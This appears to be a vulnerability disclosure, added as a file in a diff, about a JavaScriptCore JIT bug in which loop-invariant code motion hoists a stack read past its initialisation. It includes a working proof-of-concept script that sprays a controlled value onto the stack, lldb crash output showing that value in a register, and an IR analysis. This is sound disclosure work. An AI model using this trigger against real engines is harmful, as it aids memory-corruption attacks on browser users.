@@ -1,0 +1,158 @@
+While fuzzing JavaScriptCore, I encountered the following (modified and commented) JavaScript program which crashes jsc from current HEAD and release:
+
+    // Run with --useConcurrentJIT=false
+
+    // Fill the stack with the return value of the provided function.
+    function stackspray(f) {
+        // This function will spill all the local variables to the stack
+        // since they are needed for the returned array.
+        let v0 = f(); let v1 = f(); let v2 = f(); let v3 = f();
+        let v4 = f(); let v5 = f(); let v6 = f(); let v7 = f();
+        return [v0, v1, v2, v3, v4, v5, v6, v7];
+    }
+    // JIT compile the stack spray.
+    for (let i = 0; i < 1000; i++) {
+        // call twice in different ways to prevent inlining.
+        stackspray(() => 13.37);
+        stackspray(() => {});
+    }
+
+    for (let v15 = 0; v15 < 100; v15++) {
+        function v19(v23) {
+            // This weird loop form might be required to prevent loop unrolling...
+            for (let v30 = 0; v30 < 3; v30 = v30 + "asdf") {
+                // Generates the specific CFG necessary to trigger the bug.
+                const v33 = Error != Error;
+                if (v33) {
+                } else {
+                    // Force a bailout.
+                    // CFA will stop here and thus mark the following code as unreachable.
+                    // Then, LICM will ignore the memory writes (e.g. initialization of stack slots)
+                    // performed by the following code and will then move the memory reads (e.g.
+                    // access to stack slots) above the loop, where they will, in fact, be executed.
+                    const v34 = (1337)[-12345];
+                }
+
+                function v38(v41) {
+                    // v41 is 8 bytes of uninitialized stack memory here, as
+                    // (parts of) this code get moved before the loop as well.
+                    return v41.hax = 42;
+                }
+                for (let v50 = 0; v50 < 10000; v50++) {
+                    let o = {hax: 42};
+                    const v51 = v38(o, ...arguments);
+                }
+            }
+            // Force FTL compilation, probably.
+            for (let v53 = 0; v53 < 1000000; v53++) {
+            }
+        }
+
+        // Put controlled data onto the stack.
+        stackspray(() => 3.54484805889626e-310);        // 0x414141414141 in binary
+        // Call the miscompiled function.
+        const v55 = v19(1337);
+    }
+
+
+This yields a crash similar to the following:
+
+# lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc --useConcurrentJIT=false current.js
+(lldb) target create "/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc"
+Current executable set to '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64).
+(lldb) settings set -- target.run-args  "--useConcurrentJIT=false" "current.js"
+(lldb) r
+Process 45483 launched: '/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc' (x86_64)
+Process 45483 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+    frame #0: 0x000025c3ca81306e
+->  0x25c3ca81306e: cmp    dword ptr [rax], 0x127
+    0x25c3ca813074: jne    0x25c3ca81316f
+    0x25c3ca81307a: mov    dword ptr [rbp + 0x24], 0x1
+    0x25c3ca813081: movabs rax, 0x7fff3c932a70
+Target 0: (jsc) stopped.
+(lldb) reg read rax
+     rax = 0x0001414141414141           // Note the additional 0x1 at the start due to the NaN boxing scheme (see JSCJSValue.h)
+
+The same sample also sometimes triggers a crash with --useConcurrentJIT=true (the default), but it is more reliable with concurrent JIT disabled.
+If the sprayed value is a valid pointer, that pointer would either be treated as an object with the structure of `o` in the following code (if the first dword matches the structure ID), or it would be treated as a JSValue after a bailout to the baseline JIT/interpreter.
+
+
+It appears that what is happening here is roughly the following:
+
+When v19 is JIT compiled in the DFG, it emits the following (shortened and simplified) DFG IR for the body of the loop:
+
+    # BASIC BLOCK #9 (loop body)
+     # Create object `o`
+     110:   NewObject()
+     116:   PutByOffset(@110, @113, id1{hax})
+     117:   PutStructure(@110, ID:430)
+
+     # Spread `o` and `arguments` into a new array and use that for a varargs call
+     131:   Spread(@30)
+     134:   NewArrayWithSpread(@110, @131)
+     142:   LoadVarargs(@134, R:World, W:Stack(-26),Stack(-24),Stack(-23),Stack(-22),Heap)
+
+     # Inlined call to v38, load the first argument from the stack (where LoadVarargs put it)
+       8:   GetStack(R:Stack(-24))
+       177:     CheckStructure(@8)
+       178:     PutByOffset(@8, @113, id1{hax})
+       ...
+
+During loop-invariant code motion (LICM), the GetStack operation, reading from the stack slot initialized by the LoadVarargs operation, is moved in front of the loop (together with parts of the inlined v38 function), thus yielding:
+
+    # BASIC BLOCK #2 (before loop header)
+       8:   GetStack(R:Stack(-24))
+       177:     CheckStructure(@8)
+
+
+    # BASIC BLOCK #9 (loop body)
+     # Create object `o`
+      ...
+
+     # Spread `o` and `arguments` into a new array and use that for a varargs call
+     ...
+     142:   LoadVarargs(@134, R:World, W:Stack(-26),Stack(-24),Stack(-23),Stack(-22),Heap)
+     ...
+
+As such, in the resulting machine code, the value for v41 (the argument for the inner function) will be loaded from an uninitialized stack slot (which is only initialized later on in the code).
+
+Normally, this shouldn't happen as the LoadVarargs operations writes into the stack (W:Stack(-24)), and GetStack reads from that (R:Stack(-24)). Quoting from DFGLICMPhase.cpp: "Hoisting is valid if: ... The node doesn't read anything that the loop writes.". As such, GetStack should not have been moved in front of the loop.
+
+The reason that it was still moved appears to be a logical issue in the way LICM deals with dead code: LICM relies on the data computed by control flow analysis (CFA) to know whether a block will be executed at all. If a block will never be executed (and so is dead code), then LICM does not take into account memory writes (e.g. to Stack(-24)) performed by any operation in this block (See https://github.com/WebKit/webkit/blob/c755a5c371370d3a26f2dbfe0eea1b94f2f0c38b/Source/JavaScriptCore/dfg/DFGLICMPhase.cpp#L88). It appears that this behaviour is incorrect, as in this case, CFA correctly concludes that block #9 is dead code (see below). As such, LICM doesn't "see" the memory writes and incorrectly moves the GetStack operation (reading from a stack slot) in front of the LoadVarargs operation (initializing that stack slot).
+
+To understand why CFA computes that the loop body (block #9) is unreachable, it is necessary to take a look at the (simplified) control flow graph for v9, which can be found in the attachment (as it needs to be rendered in monospace font :)). In the CFG, block #3, corresponding to the `if`, is marked as always taking the false branch (which is correct), and thus jumping to block 5. Block 5 then contains a ForceOSRExit operation due to the out-of-bounds array access, which the JIT doesn't optimize for. As this operation terminates execution in the DFG, CFA also stops here and never visits the rest of the loop body and in particular never visits block #9.
+
+
+To recap: in the provided JavaScript program, CFA correctly computes that basic block #9 is never executed. Afterwards, LICM decides, based on that data, to ignore memory writes performed in block #9 (dead code), then moves memory reads from block #9 (dead code) into block #2 (alive code). The code is then unsafe to execute. It is likely that this misbehaviour could lead to other kinds of memory corruption at runtime.
+
+
+             +-----+
+             |  0  +----+
+             +-----+    |
++-----+                 |
+|  1  +-------+         v
++-----+       |     +-----------+
+   ^          |     |    2      |
+   |          +---->| loop head |
+   |                +-----+-----+
+   |                      |
+   |                      v
+   |                 +---------+
+   |                 |    3    |
+   |                 | if head |
+   |                 +--+---+--+
+   |                    |   |
+   |       +-----+      |   |      +-----+
+   |       |  5  |<-----+   +----->|  4  |
+   |       +--+--+                 +--+--+
+   |    OSRExit here                  |
+   |                   +-----+        |
+   |                   |  6  |<-------+
+   |                   +--+--+
+   |       +------+       |
+   +-------+ 7-10 |<------+
+           +---+--+
+       Rest of | Loop body
+               |
+               | To End of function
